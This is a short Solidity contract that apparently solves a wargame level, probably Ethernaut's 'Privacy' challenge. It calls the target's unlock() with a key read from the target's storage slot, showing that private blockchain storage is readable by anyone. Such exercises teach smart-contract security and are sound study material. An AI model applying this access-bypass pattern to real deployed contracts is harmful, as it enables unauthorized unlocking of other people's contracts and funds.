// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Privacy {
  function unlock(bytes16) external;
}
contract Attack {
  //This address and value taken after checking the storage value 0x5 and deployemnt of attack contract
  bytes32 key =0xc852a291dcfb8744012b9e035f324ae23352a2af35a732a94dfb1f9f45a7c052;
  address public privacyAddr=0xE2E7cc8e1981A27C9461b5682a484cDF80c36569;
  Privacy privacy=Privacy(privacyAddr);
  function attackOn() external {
    bytes16 key16=bytes16(key);
    privacy.unlock(key16);

  }
  
 


}